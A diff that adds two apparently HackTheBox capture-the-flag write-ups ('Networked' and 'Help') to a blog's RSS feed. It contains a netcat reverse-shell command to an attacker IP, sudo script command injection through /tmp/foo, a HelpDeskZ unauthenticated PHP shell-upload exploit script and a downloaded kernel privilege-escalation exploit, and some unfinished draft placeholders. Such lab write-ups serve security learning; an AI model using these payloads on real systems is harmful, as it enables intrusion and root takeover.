+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/network-scripts/ifcfg-guly
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+  
+/sbin/ifup guly0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So this script changes some values in a configuration file regarding the network interface guly0. I decide to check the configuration file:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+NAME=ps /tmp/foo
+PROXY_METHOD=asodih
+BROWSER_ONLY=asdoih
+BOOTPROTO=asdoih&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When I run changename.sh as guly without sudo, it prompts me to change each field (where I enter “test”), but I don’t have permission to do so.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ changename.sh
+/usr/local/sbin/changename.sh: line 2: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+interface NAME:
+test
+/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+interface PROXY_METHOD:
+test
+/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+interface BROWSER_ONLY:
+test
+/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+interface BOOTPROTO:
+test
+/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
+grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
+/etc/sysconfig/network-scripts/ifcfg-guly: line 4: /tmp/foo: No such file or directory
+Users cannot control this device.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;What’s strange is that second to last line: “/tmp/foo: No such file or directory”. It implies that something at /tmp/foo is trying to be executed, but there’s no file there. /tmp is generally a world-writable directory, so I try to add my own “foo” there and rerun the script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ echo &quot;echo test&quot; &amp;gt; /tmp/foo                                                     
+[guly@networked ~]$ chmod 777 /tmp/foo                                                              
+[guly@networked ~]$ changename.sh                                                                   &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And in my output, I see that “test” was echoed.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
+grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
+grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
+test                                                                                                
+Users cannot control this device.                                                                   &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So it seems as though, if I store any command as /tmp/foo, the user running changename.sh will execute it. If I try with “cat /root/root.txt–and sudo the changename.sh script this time–root should read the root flag in the output. I’ll also have to be careful not to change the “NAME” field (ps /tmp/foo), as root can actually modify the fields, and this will likely mess things up.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ echo &quot;cat /root/root.txt&quot; &amp;gt; /tmp/foo
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                                             
+interface NAME:
+ps /tmp/foo
+interface PROXY_METHOD:                                                                             
+s                      
+interface BROWSER_ONLY:
+s                                                                                                   
+interface BOOTPROTO:   
+s
+0a8e############################                                                                    
+0a8e############################
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delay
+ing initialization.                                                                                 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As expected, the flag appears in the output.&lt;/p&gt;
+
+&lt;h1 id=&quot;bonus-points-root-shell&quot;&gt;Bonus points: root shell&lt;/h1&gt;
+
+&lt;p&gt;The technique to read the flag doesn’t take much modifying to get root shell. Simply replace /tmp/foo with a netcat command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ echo &quot;nc -e /bin/bash 10.10.14.27 3333&quot; &amp;gt; /tmp/foo
+[guly@networked ~]$ chmod 777 /tmp/foo
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                
+interface NAME:
+ps /tmp/foo
+interface PROXY_METHOD:
+s
+interface BROWSER_ONLY:
+s
+interface BOOTPROTO:
+s&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nc -nlvp 3333
+listening on [any] 3333 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 47768
+whoami
+root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Fri, 04 Oct 2019 14:31:19 -0400</pubDate>
+        <link>http://localhost:4000/writeup/2019/10/04/networked-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/04/networked-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
+    
+      <item>
+        <title>Help</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/help/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nmap 10.10.10.121 -sC -sV -oA help.nmap
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 18:42 EDT
+Nmap scan report for 10.10.10.121
+Host is up (0.051s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We see SSH and two HTTP ports. As usual, we’ll set SSH aside for now, assuming it’ll be used for access later on.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Port 80&lt;/strong&gt; has the default Apache2 page up:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Port 3000&lt;/strong&gt; has an entirely different story:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So what do we do first? I started with what I was more familiar with and fuzzed port 80 for extra directories—but apparently there is a way forward with port 3000.&lt;/p&gt;
+
+&lt;h1 id=&quot;discovering-helpdeskz&quot;&gt;Discovering HelpDeskZ&lt;/h1&gt;
+
+&lt;p&gt;I used Dirb to find a support page:&lt;/p&gt;
+
+&lt;p&gt;SHOW IMPORTANT DIRB THINGS HERE&lt;/p&gt;
+
+&lt;p&gt;Here’s what we see:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I do some initial research and come across this exploit: &lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;https://www.exploit-db.com/exploits/40300&lt;/a&gt;. This was missing some punctuation though that made it necessary to run, so I found an alternative here: &lt;a href=&quot;https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1608-exploits/helpdeskz-shell.txt&quot;&gt;https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1608-exploits/helpdeskz-shell.txt&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The exploit describes a way of enumerating uploaded files, so that if you upload PHP code (unauthenticated!), you can find the URL and execute it. HelpDeskZ hashes the filename with MD5 and appends it to the current time (using epoch time)—a predictable pattern we can enumerate.&lt;/p&gt;
+
+&lt;p&gt;Before we go crazy using this exploit (which I, admittedly, did and had no success), we need to verify a few things:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The version of HelpDeskZ&lt;/li&gt;
+  &lt;li&gt;What files we can upload&lt;/li&gt;
+  &lt;li&gt;The upload path&lt;/li&gt;
+  &lt;li&gt;The correct time
+&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;verifying-the-exploit&quot;&gt;Verifying the exploit&lt;/h1&gt;
+
+&lt;h2 id=&quot;helpdeskz-version&quot;&gt;HelpDeskZ version&lt;/h2&gt;
+
+&lt;h2 id=&quot;what-files-we-can-upload&quot;&gt;What files we can upload&lt;/h2&gt;
+
+&lt;p&gt;You can find the file upload in the Submit Ticket functionality. It includes a few simple text fields, a “Browse” upload button, and a CAPTCHA, which makes automated attacks (e.g., fuzzing different file extensions) tricky.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;My first instinct is to take php-reverse-shell.php &lt;strong&gt;(where can this be found?)&lt;/strong&gt; with my IP and port 443 and try uploading it (as shell.php). It appears as though the upload failed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As I see it, there are two paths from here:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Blindly attempt a million and one known upload bypasses&lt;/li&gt;
+  &lt;li&gt;Review the open-source code in Github&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Because I clearly know what I’m doing, I spent a few hours on #1. I also keep failing these CAPTCHAs. I realize I haven’t been to the eye doctor in three years. I can continue down this rabbit hole of getting my life back together, or I can jump to #2 . . .&lt;/p&gt;
+
+&lt;p&gt;With any open-source software, it always pays to check out the code on Github, even if you (i.e., me) are super lazy and want to skip that step.&lt;/p&gt;
+
+&lt;p&gt;COOL PASSAGE ABOUT ANALYZING THE CODE HERE – AND HOW THE PHP SHELL IS ACTUALLY ON THE SERVER&lt;/p&gt;
+
+&lt;h2 id=&quot;the-upload-path&quot;&gt;The upload path&lt;/h2&gt;
+
+&lt;p&gt;ALSO ON GITHUB&lt;/p&gt;
+
+&lt;h2 id=&quot;the-correct-time&quot;&gt;The correct time&lt;/h2&gt;
+
+&lt;p&gt;This one factor makes me strongly disagree with the 20-point “Easy” ranking of the box. It’s one detail, but it causes a ton of trouble. I feel like the creator wasn’t aware of this issue . . .&lt;/p&gt;
+
+&lt;p&gt;Basically, the PHP upload exploit is based on time. The server is in a completely different time zone than your attacking box, yet running the exploit script locally will insert your time into the exploit, not the server’s time. The script is set to a range or (0, 300)—in other words, every second of the past five minutes. If you aren’t within a couple minutes of the server time, you aren’t going to find your shell.&lt;/p&gt;
+
+&lt;p&gt;Just to add to the complication: The server time is off from the official time zone time.&lt;/p&gt;
+
+&lt;p&gt;There are a few ways to tackle this problem:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Modify the Python script to GET the server time and incorporate it into the file name (as Ippsec does in his video)&lt;/li&gt;
+  &lt;li&gt;Sync your local box with the server time&lt;/li&gt;
+  &lt;li&gt;Scramble and add the server time as the value of the variable in the Python script, upload the shell, quickly run the script, and pray&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;
+#2 was not working out for me, even though I was careful to line up my time super duper closely to the server time. So I had to resort to #3 and do all of the following steps in like a millisecond:&lt;/p&gt;
+
+&lt;p&gt;1) Send a GET request to http://10.10.10.121/support and view the headers in Burp.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Convert the time to Epoch time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Upload my shell.&lt;/p&gt;
+
+&lt;p&gt;4) Modify the script to use that Epoch time.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;helpdeskzBaseUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#currentTime = int(time.time()) &amp;lt;-- Original line; local time
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;currentTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1569204120&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &amp;lt;-- New line
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plaintext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;currentTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plaintext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;helpdeskzBaseUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.php'&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;       &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;found!&quot;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;       &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;       &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sorry, I did not find anything&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;5) Run the script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
+found!
+http://10.10.10.121/support/uploads/tickets/187212870f5853aeaa5787d39b46b16a.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Set up a Netcat listener, visit the link, and rejoice.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upgrade your shell to a Python TTY:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help/image9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we’re on host &lt;strong&gt;help&lt;/strong&gt; as user &lt;strong&gt;help&lt;/strong&gt;. The user flag can be found in help’s home folder:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;help@help:/home/help$ wc -c user.txt
+wc -c user.txt
+33 user.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;privilege-escalation-kernel-exploit&quot;&gt;Privilege Escalation: Kernel exploit&lt;/h1&gt;
+
+&lt;p&gt;One of the first things to do when escalating privileges in Linux is to view the kernel version with &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;help@help:/home/help$ uname -a
+uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I search for “linux 4.4.0-116”, and one of the first results is this exploit: &lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;https://www.exploit-db.com/exploits/44298&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I copy it over to my Kali box and server it up with Python SimpleHTTPServer:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# searchsploit -m 44298
+
+Exploit: Linux Kernel &amp;lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
+
+URL: https://www.exploit-db.com/exploits/44298
+
+Path: /usr/share/exploitdb/exploits/linux/local/44298.c
+
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /root/44298.c
+
+root@kali:~# python -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;On the victim machine, I move to a /tmp folder and download the exploit:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;help@help:/home/help$ cd /tmp
+cd /tmp
+help@help:/tmp$ wget http://10.10.14.11:8888/44298.c
+wget http://10.10.14.11:8888/44298.c
+--2019-09-22 19:15:31--  http://10.10.14.11:8888/44298.c
+Connecting to 10.10.14.11:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6021 (5.9K) [text/plain]
+Saving to: '44298.c'
+
+44298.c             100%[===================&amp;gt;]   5.88K  --.-KB/s    in 0s
+
+2019-09-22 19:15:31 (333 MB/s) - '44298.c' saved [6021/6021]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I compile it and make it executable:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;help@help:/tmp$ gcc 44298.c -o 44298
+gcc 44298.c -o 44298
+help@help:/tmp$ chmod +x 44298
+chmod +x 44298&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I run it:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;help@help:/tmp$ ./44298
+./44298
+task_struct = ffff88003a887000
+uidptr = ffff880038a13084
+spawning root shell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we have root.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@help:/tmp# whoami
+whoami
+root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Proof of flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@help:/root# wc -c root.txt
+wc -c root.txt
+33 root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Fri, 04 Oct 2019 14:31:15 -0400</pubDate>
+        <link>http://localhost:4000/writeup/2019/10/04/help-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/04/help-writeup/</guid>
         
         <category>hackthebox</category>
         
